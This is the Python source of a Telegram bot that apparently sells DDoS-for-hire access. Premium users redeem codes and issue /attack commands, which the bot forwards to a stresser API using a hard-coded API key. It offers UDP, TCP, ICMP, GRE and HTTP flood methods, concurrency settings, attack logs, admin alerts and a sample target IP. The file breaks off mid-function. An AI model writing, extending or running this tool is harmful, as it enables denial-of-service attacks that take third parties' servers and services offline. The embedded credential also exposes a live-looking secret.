# app.py - COMPLETE FIX WITH PROPER CONCURRENT SUPPORT & UDP-FLOOD DEFAULT

import os
import logging
import asyncio
import threading
import aiohttp
import time
import random
import string
import json
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
import pymongo
from pymongo import MongoClient
from dotenv import load_dotenv
from quart import Quart, jsonify

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
API_URL = os.getenv("API_URL", "https://mrstresser.com/api")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
PORT = int(os.getenv("PORT", 8080))

# CONCURRENT SETTINGS
DEFAULT_CONCURRENT = 4  # Changed to 1 as requested
MIN_CONCURRENT = 4
MAX_CONCURRENT = 8
MIN_DURATION = 30
MAX_DURATION = 300

# ATTACK METHODS - UDP-FLOOD (UDP-FREE) as default
ATTACK_METHODS = [
    "UDP-FLOOD",  # This maps to UDP-FREE in API - DEFAULT
    "UDP-VSE", "UDP-DNS",
    "TCP-SYN", "TCP-ACK", "TCP-STOMP", "TCP-HANDSHAKE",
    "ICMP-FLOOD", "GRE-FLOOD",
    "TLSV2", "HTTPS-MIX", "HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER"
]

METHOD_MAP = {
    "UDP-FLOOD": "udp-free",  # Changed from udp-flood to udp-free
    "UDP-VSE": "udp-vse", 
    "UDP-DNS": "udp-dns",
    "TCP-SYN": "tcp-syn",
    "TCP-ACK": "tcp-ack",
    "TCP-STOMP": "tcp-stomp",
    "TCP-HANDSHAKE": "tcp-handshake",
    "ICMP-FLOOD": "icmp-flood",
    "GRE-FLOOD": "gre-flood",
    "TLSV2": "TLSV2",
    "HTTPS-MIX": "HTTPS-MIX",
    "HTTP-KILLER": "HTTP-KILLER",
    "HTTP-DESTROYER": "HTTP-DESTROYER",
    "HTTP-BYPASSER": "HTTP-BYPASSER"
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Quart(__name__)

@app.route('/')
async def index():
    return "🤖 GURU Attack Bot - UDP-FREE Default"

@app.route('/health')
async def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/concurrent')
async def concurrent_status():
    stats = attack_manager.get_stats()
    return jsonify({
        "active_attack": stats['active_attack'],
        "concurrent_value": stats['concurrent_value'],
        "is_running": stats['is_running'],
        "current_target": stats['current_target'],
        "remaining_time": stats['remaining_time']
    })

# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = False
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.broadcasts = []
        self.settings = {"pause_all": False}
        
        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000,
                    maxPoolSize=50
                )
                self.client.admin.command('ping')
                
                self.db = self.client["guru_bot"]
                self.users = self.db.users
                self.codes = self.db.redeem_codes
                self.logs = self.db.attack_logs
                self.admins = self.db.admins
                self.broadcasts = self.db.broadcasts
                self.settings = self.db.settings
                
                try:
                    self.users.create_index("user_id", unique=True)
                    self.codes.create_index("code", unique=True)
                    self.broadcasts.create_index("created_at", -1)
                    self.admins.create_index("user_id", unique=True)
                except Exception as e:
                    logger.warning(f"Index creation warning: {e}")
                
                if not self.settings.find_one({"_id": "bot_settings"}):
                    self.settings.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None
                    })
                
                logger.info("✅ MongoDB connected successfully!")
                self.memory_mode = False
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")
    
    def add_user(self, user_id, username=None, first_name=None):
        try:
            if not self.memory_mode:
                result = self.users.update_one(
                    {"user_id": user_id},
                    {"$setOnInsert": {
                        "username": username, 
                        "first_name": first_name, 
                        "last_active": datetime.now(),
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "ban_reason": None,
                        "banned_by": None,
                        "banned_at": None,
                        "last_attack_time": None,
                        "last_attack_duration": 0,
                        "attack_count": 0,
                        "created_at": datetime.now()
                    }},
                    upsert=True
                )
                return result
            else:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id, 
                        "username": username, 
                        "first_name": first_name,
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "last_attack_time": None,
                        "last_attack_duration": 0,
                        "attack_count": 0
                    }
                    return True
                return False
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False
    
    def get_user(self, user_id):
        try:
            if not self.memory_mode:
                return self.users.find_one({"user_id": user_id})
            return self.users.get(user_id)
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None
    
    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            
            if plan == "free":
                return "free", None
            
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except:
                        return "premium", None
                
                if expiry and isinstance(expiry, datetime):
                    if expiry < datetime.now():
                        return "premium", expiry
                    else:
                        return "premium", expiry
                else:
                    return "premium", None
            
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None
    
    def update_user_plan(self, user_id, plan, expiry):
        try:
            if not self.memory_mode:
                expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
                result = self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": plan, 
                        "plan_expiry": expiry_str,
                        "has_used_code": True if plan == "premium" else False
                    }}
                )
                return result.modified_count > 0 or result.matched_count > 0
            else:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry
                    return True
                return False
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False
    
    def get_user_stats(self, user_id):
        try:
            if not self.memory_mode:
                return self.logs.count_documents({"user_id": user_id})
            else:
                return len([l for l in self.logs if l.get("user_id") == user_id])
        except:
            return 0
    
    def get_total_attacks(self):
        try:
            if not self.memory_mode:
                return self.logs.count_documents({})
            return len(self.logs)
        except:
            return 0
    
    def is_admin(self, user_id):
        try:
            if not self.memory_mode:
                return self.admins.find_one({"user_id": user_id}) is not None
            return user_id in self.admins
        except:
            return False
    
    def get_admin_level(self, user_id):
        try:
            if not self.memory_mode:
                admin = self.admins.find_one({"user_id": user_id})
                return admin.get("level") if admin else None
            return self.admins.get(user_id, {}).get("level")
        except:
            return None
    
    def is_owner_or_pseudo(self, user_id):
        level = self.get_admin_level(user_id)
        return level in ["owner", "pseudo_owner"]
    
    def add_admin(self, user_id, username, level, added_by):
        try:
            if not self.memory_mode:
                if self.admins.find_one({"user_id": user_id}):
                    return False
                self.admins.insert_one({
                    "user_id": user_id,
                    "username": username,
                    "level": level,
                    "added_by": added_by,
                    "added_at": datetime.now()
                })
                self.update_user_plan(user_id, "premium", None)
                return True
            else:
                if user_id in self.admins:
                    return False
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                    self.users[user_id]["plan_expiry"] = None
                return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False
    
    def remove_admin(self, user_id):
        try:
            if not self.memory_mode:
                result = self.admins.delete_one({"user_id": user_id})
                if result.deleted_count > 0:
                    return True
                return False
            else:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
        except:
            return False
    
    def get_admins(self):
        try:
            if not self.memory_mode:
                return list(self.admins.find({}))
            return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
        except:
            return []
    
    def get_banned_users(self):
        try:
            if not self.memory_mode:
                return list(self.users.find({"is_banned": True}))
            return [uid for uid, data in self.users.items() if data.get("is_banned", False)]
        except:
            return []
    
    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
                )
            elif user_id in self.users:
                self.users[user_id]["is_banned"] = True
                self.users[user_id]["ban_reason"] = reason
            return True
        except:
            return False
    
    def unban_user(self, user_id):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
                )
            elif user_id in self.users:
                self.users[user_id]["is_banned"] = False
                self.users[user_id]["ban_reason"] = None
            return True
        except:
            return False
    
    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except:
            return False
    
    def update_last_attack(self, user_id, duration):
        try:
            if not self.memory_mode:
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "last_attack_time": datetime.now().isoformat(),
                        "last_attack_duration": duration
                    },
                    "$inc": {"attack_count": 1}}
                )
            elif user_id in self.users:
                self.users[user_id]["last_attack_time"] = datetime.now()
                self.users[user_id]["last_attack_duration"] = duration
                self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            return True
        except:
            return False
    
    def get_attack_count(self, user_id):
        try:
            user = self.get_user(user_id)
            if user:
                return user.get("attack_count", 0)
            return 0
        except:
            return 0
    
    def create_code(self, code, days, created_by):
        try:
            if not self.memory_mode:
                if self.codes.find_one({"code": code}):
                    return False
                self.codes.insert_one({
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "used_by": None,
                    "used_at": None,
                    "is_used": False
                })
                return True
            else:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_at": datetime.now(),
                    "is_used": False
                }
                return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False
    
    def use_code(self, code, user_id):
        try:
            if not self.memory_mode:
                code_data = self.codes.find_one({"code": code, "is_used": False})
                if not code_data:
                    return None
                
                self.codes.update_one(
                    {"code": code},
                    {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                )
                
                days = code_data['access_days']
                if days >= 3650:
                    expiry = None
                else:
                    expiry = datetime.now() + timedelta(days=days)
                
                if not self.get_user(user_id):
                    self.add_user(user_id)
                
                expiry_str = expiry.isoformat() if expiry else None
                
                self.users.update_one(
                    {"user_id": user_id},
                    {"$set": {
                        "plan": "premium",
                        "plan_expiry": expiry_str,
                        "has_used_code": True,
                        "code_used": code,
                        "redeem_date": datetime.now().isoformat()
                    }}
                )
                
                return code_data
            else:
                if code in self.codes and not self.codes[code]["is_used"]:
                    code_data = self.codes[code]
                    code_data["is_used"] = True
                    days = code_data['access_days']
                    if days >= 3650:
                        expiry = None
                    else:
                        expiry = datetime.now() + timedelta(days=days)
                    
                    if user_id in self.users:
                        self.users[user_id]["plan"] = "premium"
                        self.users[user_id]["plan_expiry"] = expiry
                        self.users[user_id]["has_used_code"] = True
                        self.users[user_id]["code_used"] = code
                        self.users[user_id]["redeem_date"] = datetime.now()
                        return code_data
            return None
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None
    
    def get_codes(self, only_unused=False):
        try:
            if not self.memory_mode:
                query = {"is_used": False} if only_unused else {}
                return list(self.codes.find(query).sort("created_at", -1))
            else:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c["is_used"]]
                return codes
        except:
            return []
    
    def delete_code(self, code):
        try:
            if not self.memory_mode:
                result = self.codes.delete_one({"code": code})
                if result.deleted_count > 0:
                    return True
                return False
            else:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
        except:
            return False
    
    def log_broadcast(self, broadcast_id, sent_by, total_users, successful, failed, media_type=None):
        try:
            if not self.memory_mode:
                self.broadcasts.insert_one({
                    "broadcast_id": broadcast_id,
                    "sent_by": sent_by,
                    "total_users": total_users,
                    "successful": successful,
                    "failed": failed,
                    "media_type": media_type,
                    "created_at": datetime.now()
                })
            else:
                self.broadcasts.append({
                    "broadcast_id": broadcast_id,
                    "sent_by": sent_by,
                    "total_users": total_users,
                    "successful": successful,
                    "failed": failed,
                    "media_type": media_type,
                    "created_at": datetime.now()
                })
            return True
        except:
            return False
    
    def get_broadcast_stats(self):
        try:
            if not self.memory_mode:
                return list(self.broadcasts.find({}).sort("created_at", -1).limit(10))
            else:
                return self.broadcasts[-10:]
        except:
            return []
    
    def get_pause_status(self):
        try:
            if not self.memory_mode:
                settings = self.settings.find_one({"_id": "bot_settings"})
                if settings:
                    return settings.get("pause_all", False)
            return self.settings.get("pause_all", False)
        except:
            return self.settings.get("pause_all", False)
    
    def get_pause_info(self):
        try:
            if not self.memory_mode:
                settings = self.settings.find_one({"_id": "bot_settings"})
                if settings:
                    return {
                        "paused": settings.get("pause_all", False),
                        "paused_by": settings.get("paused_by"),
                        "paused_at": settings.get("paused_at"),
                        "pause_reason": settings.get("pause_reason")
                    }
            return {
                "paused": self.settings.get("pause_all", False),
                "paused_by": None,
                "paused_at": None,
                "pause_reason": None
            }
        except:
            return {
                "paused": self.settings.get("pause_all", False),
                "paused_by": None,
                "paused_at": None,
                "pause_reason": None
            }
    
    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if not self.memory_mode:
                self.settings.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason
                    }},
                    upsert=True
                )
            self.settings["pause_all"] = paused
            return True
        except:
            self.settings["pause_all"] = paused
            return False
    
    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now()
            }
            if not self.memory_mode:
                self.logs.insert_one(log)
            else:
                self.logs.append(log)
            
            self.update_last_attack(user_id, duration)
            
            user = self.get_user(user_id)
            username = user.get("username") if user else None
            first_name = user.get("first_name") if user else None
            return {
                "user_id": user_id,
                "username": username,
                "first_name": first_name,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "concurrent": concurrent_count
            }
        except:
            return None
    
    def get_all_users(self):
        try:
            if not self.memory_mode:
                return list(self.users.find({}))
            return list(self.users.values())
        except:
            return []

db = Database(MONGO_URI)

# ===== INITIALIZE OWNER =====
def init_owner():
    try:
        owner = db.get_user(OWNER_ID)
        if not owner:
            db.add_user(OWNER_ID, "owner", "Owner")
        
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        
        plan, expiry = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")

def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
            if not pseudo_owner:
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            
            plan, expiry = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")

init_owner()
init_pseudo_owner()

# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method, concurrent=1):
    """Send attack to API with proper concurrent parameter"""
    api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
    api_url = os.getenv("API_URL", "https://mrstresser.com/api")
    
    if not api_key:
        return {"success": False, "error": "API Key missing"}
    
    api_method = METHOD_MAP.get(method.upper(), "udp-free")  # Default to udp-free
    
    # Build base parameters
    params = {
        "key": api_key,
        "host": target,
        "port": str(port),
        "time": str(duration),
        "method": api_method,
    }
    
    # Add concurrent parameter
    params["concs"] = str(concurrent)
    
    # Advanced options for L7 methods
    if method.upper() in ["HTTP-KILLER", "HTTP-DESTROYER", "HTTP-BYPASSER", "HTTPS-MIX", "TLSV2"]:
        params["req_method"] = "GET"
        params["geoloc"] = "MIX"
        params["version"] = "1"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    
    logger.info(f"🚀 Sending attack with {concurrent} concurrent to {target}:{port}")
    logger.info(f"📡 Params: {params}")
    
    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
            start_time = time.time()
            
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                
                try:
                    response_text = await response.text(encoding='utf-8', errors='ignore')
                    
                    # Try to parse JSON
                    try:
                        response_data = json.loads(response_text)
                    except:
                        response_data = {"raw": response_text[:200]}
                    
                except Exception as e:
                    response_text = f"Error reading response: {e}"
                    response_data = {"error": str(e)}
                
                logger.info(f"📊 API Response: {response.status} in {elapsed:.2f}s")
                logger.info(f"📊 Response: {response_text[:200]}")
                
                if response.status == 200:
                    return {
                        "success": True,
                        "elapsed": elapsed,
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data,
                        "raw_response": response_text[:200]
                    }
                else:
                    return {
                        "success": False,
                        "error": f"HTTP {response.status}",
                        "status": response.status,
                        "concurrent": concurrent,
                        "response": response_data,
                        "raw_response": response_text[:200]
                    }
                    
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": concurrent}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:50], "concurrent": concurrent}

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attack = None
        self.attack_id_counter = 0
        self.total_attacks = 0
        self.is_running = False
        self.current_target = None
        self.current_user = None
        self.attack_start_time = None
        self.attack_duration = 0
        self.current_concurrent = DEFAULT_CONCURRENT
        self.attack_lock = asyncio.Lock()
        self.attack_task = None
        
        logger.info(f"🔥 Attack Manager initialized with concurrent: {DEFAULT_CONCURRENT}")
    
    async def can_start_attack(self, user_id):
        """Check if an attack can start"""
        async with self.attack_lock:
            if self.is_running:
                if self.attack_start_time:
                    elapsed = (datetime.now() - self.attack_start_time).total_seconds()
                    remaining = max(0, self.attack_duration - elapsed)
                    return False, f"❌ ATTACK IN PROGRESS!\n\n🎯 Target: {self.current_target}\n⏱️ Remaining: {int(remaining)}s\n🔄 Concurrent: **{self.current_concurrent}**\n\n⏳ Please wait {int(remaining)}s for it to finish!"
            
            if db.is_banned(user_id):
                return False, "❌ You are banned!"
            
            plan, expiry = db.get_user_plan(user_id)
            is_owner = db.is_owner_or_pseudo(user_id)
            is_admin = db.is_admin(user_id)
            
            if not is_owner and not is_admin and plan != "premium":
                return False, "❌ *PREMIUM REQUIRED*\n\nUse `/redeem CODE` to activate."
            
            if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
                return False, "❌ *PLAN EXPIRED*"
            
            return True, "OK"
    
    async def start_attack(self, user_id, target, port, duration, method, context, concurrent=DEFAULT_CONCURRENT):
        """Start an attack with specified concurrent connections"""
        async with self.attack_lock:
            if self.is_running:
                return None, "Attack already in progress!"
            
            self.attack_id_counter += 1
            attack_id = self.attack_id_counter
            self.total_attacks += 1
            self.is_running = True
            self.current_target = f"{target}:{port}"
            self.current_user = user_id
            self.attack_start_time = datetime.now()
            self.attack_duration = duration
            self.current_concurrent = concurrent
            
            self.active_attack = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration),
                'status': 'running',
                'concurrent': concurrent
            }
            
            logger.info(f"🔥 Attack {attack_id} starting - User: {user_id} - Target: {target}:{port} - Concurrent: {concurrent}")
            
            # Start attack task
            self.attack_task = asyncio.create_task(
                self.execute_attack(
                    attack_id, target, port, duration, user_id, context, method, concurrent
                )
            )
            
            # Cleanup after attack
            asyncio.create_task(self.cleanup_attack(attack_id, duration))
            
            return attack_id, f"Attack started with {concurrent} concurrent connections"
    
    async def execute_attack(self, attack_id, target, port, duration, user_id, context, method, concurrent):
        """Execute attack with specified concurrent connections"""
        try:
            # Send API request
            result = await send_api_attack(target, port, duration, method, concurrent)
            
            # Log the attack
            attack_info = db.log_attack(
                user_id,
                target,
                port,
                duration,
                method,
                "success" if result.get('success') else "failed",
                str(result.get('response', {}))[:200],
                concurrent_count=concurrent
            )
            
            # Send alert to admins
            if attack_info:
                await send_attack_alert(attack_info, result)
            
            # Notify user about the result
            try:
                if result.get('success'):
                    await context.bot.send_message(
                        user_id,
                        f"✅ *Attack Completed!*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"🔄 Concurrent: **{concurrent}**\n"
                        f"📡 Method: `{method}` (UDP-FREE)\n"
                        f"⚡ Status: SUCCESS\n"
                        f"⏱️ Response: `{result.get('elapsed', 0):.2f}s`",
                        parse_mode='Markdown'
                    )
                else:
                    await context.bot.send_message(
                        user_id,
                        f"❌ *Attack Failed!*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"🔄 Concurrent: **{concurrent}**\n"
                        f"❌ Error: `{result.get('error', 'Unknown error')}`\n"
                        f"📊 Status: `{result.get('status', 'N/A')}`",
                        parse_mode='Markdown'
                    )
            except:
                pass
            
            logger.info(f"✅ Attack {attack_id} completed with {concurrent} concurrent")
                
        except Exception as e:
            logger.error(f"❌ Attack {attack_id} error: {e}")
    
    async def cleanup_attack(self, attack_id, duration):
        """Clean up attack after duration"""
        await asyncio.sleep(duration + 2)
        
        async with self.attack_lock:
            if self.active_attack and self.active_attack['id'] == attack_id:
                self.is_running = False
                self.current_target = None
                self.current_user = None
                self.attack_start_time = None
                self.attack_duration = 0
                self.current_concurrent = DEFAULT_CONCURRENT
                self.active_attack = None
                self.attack_task = None
                
                logger.info(f"✅ Attack {attack_id} cleaned up")
    
    async def stop_attack(self, user_id):
        """Stop the current attack"""
        async with self.attack_lock:
            if not self.is_running:
                return False, "No attack is running"
            
            # Cancel the attack task if it exists
            if self.attack_task and not self.attack_task.done():
                self.attack_task.cancel()
            
            # Reset state
            self.is_running = False
            target = self.current_target
            self.current_target = None
            self.current_user = None
            self.attack_start_time = None
            self.attack_duration = 0
            self.current_concurrent = DEFAULT_CONCURRENT
            self.active_attack = None
            self.attack_task = None
            
            return True, f"Attack on {target} stopped"
    
    def get_stats(self):
        """Get current stats"""
        remaining = 0
        if self.is_running and self.attack_start_time:
            elapsed = (datetime.now() - self.attack_start_time).total_seconds()
            remaining = max(0, self.attack_duration - elapsed)
        
        return {
            'active_attack': self.is_running,
            'concurrent_value': self.current_concurrent if self.is_running else DEFAULT_CONCURRENT,
            'is_running': self.is_running,
            'current_target': self.current_target,
            'current_user': self.current_user,
            'remaining_time': int(remaining),
            'total_attacks': self.total_attacks
        }

attack_manager = AttackManager()

# ===== SEND ALERT TO ADMINS =====
async def send_attack_alert(attack_info, result=None):
    try:
        admins = db.get_admins()
        user = db.get_user(attack_info['user_id'])
        plan = user.get('plan', 'free') if user else 'free'
        
        status_emoji = "✅" if result and result.get('success') else "❌"
        status_text = "SUCCESS" if result and result.get('success') else "FAILED"
        
        message = (
            f"⚡ *ATTACK ALERT*\n\n"
            f"{status_emoji} Status: {status_text}\n"
            f"👤 User: {attack_info.get('first_name', 'Unknown')}\n"
            f"🆔 ID: `{attack_info['user_id']}`\n"
            f"📊 Plan: {plan.upper()}\n"
            f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
            f"⏱️ Duration: {attack_info['duration']}s\n"
            f"📡 Method: {attack_info['method'].upper()} (UDP-FREE)\n"
            f"🔄 Concurrent: **{attack_info['concurrent']}**\n"
            f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        if result and result.get('elapsed'):
            message += f"\n⏱️ Response: `{result['elapsed']:.2f}s`"
        
        for admin in admins:
            try:
                global application
                if application:
                    await application.bot.send_message(
                        admin['user_id'],
                        message,
                        parse_mode='Markdown'
                    )
            except:
                pass
    except Exception as e:
        logger.error(f"Alert error: {e}")

# ===== COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    context.user_data.clear()
    db.add_user(user_id, user.username, user.first_name)
    
    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text(
            f"⏸️ *Bot is Paused*\n\nPlease wait until it's resumed.",
            parse_mode='Markdown'
        )
        return
    
    total_attacks = db.get_user_stats(user_id)
    stats = attack_manager.get_stats()
    
    if plan == "premium":
        if expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            plan_display = f"💎 PREMIUM ({days_left}d left)"
        else:
            plan_display = "💎 PREMIUM (Lifetime)"
    else:
        plan_display = "🆓 FREE (Redeem code to upgrade)"
    
    first_name = user.first_name or "User"
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    remaining = stats['remaining_time']
    
    welcome_msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"⏱️ Remaining: {remaining}s\n"
        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME'}\n"
        f"📡 Default method: UDP-FLOOD (UDP-FREE)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n\n"
        f"⚡ *ATTACK FEATURES*\n"
        f"• {DEFAULT_CONCURRENT}x concurrent connections\n"
        f"• Only 1 attack at a time\n"
        f"📡 *Methods:*\n" + "\n".join([f"• {m}" + (" ⭐ DEFAULT" if m == "UDP-FLOOD" else "") for m in ATTACK_METHODS[:5]]) + f"\n... and {len(ATTACK_METHODS)-5} more"
    )
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await update.message.reply_text(
        welcome_msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
            f"Example: `/attack 91.108.17.41 32001 60` (Uses UDP-FLOOD default)\n"
            f"With method: `/attack 91.108.17.41 32001 60 TCP-SYN`\n"
            f"With concurrent: `/attack 91.108.17.41 32001 60 UDP-FLOOD 1`\n\n"
            f"⚡ Current concurrent: **{DEFAULT_CONCURRENT}**\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
            f"📡 Default Method: UDP-FLOOD (UDP-FREE)\n"
            f"📡 Available methods: {', '.join(ATTACK_METHODS[:5])}...",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        # Set default method to UDP-FLOOD if not specified
        method = "UDP-FLOOD"
        concurrent = DEFAULT_CONCURRENT
        
        # Parse remaining arguments
        if len(args) > 3:
            # Check if 4th arg is a number (concurrent)
            if args[3].isdigit():
                concurrent = int(args[3])
                if len(args) > 4:
                    method = args[4].upper()
            else:
                method = args[3].upper()
                if len(args) > 4 and args[4].isdigit():
                    concurrent = int(args[4])
        
        # Validate method
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        # Validate concurrent
